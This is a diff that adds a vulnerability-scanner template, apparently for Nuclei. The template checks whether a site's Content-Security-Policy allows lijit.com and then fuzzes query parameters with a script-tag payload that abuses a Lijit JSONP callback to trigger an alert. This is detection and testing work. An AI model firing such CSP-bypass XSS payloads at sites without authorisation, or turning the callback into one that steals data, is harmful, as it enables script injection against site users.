@@ -1,0 +1,55 @@
+id: lijit-ap-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Lijit AP
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,lijit-ap
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "lijit.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: lijit_ap_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://ap.lijit.com/rtb/bid?callback=alert&br={%22id%22:%221%22,%22site%22:{%22domain%22:%22x%22,%22page%22:%22x%22}}"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "lijit_ap_csp_xss == true"
+# digest: 4a0a00473045022100d8adabab1a89a49c4582860007be04c265c9d85cec90da359983f0e7692d89ba02200954a88b8116fa1682343bb2ef47a5223fcf5bf8ef9c2ee1f22fc8d045162c17:922c64590222798bb761d5b6d8e72950
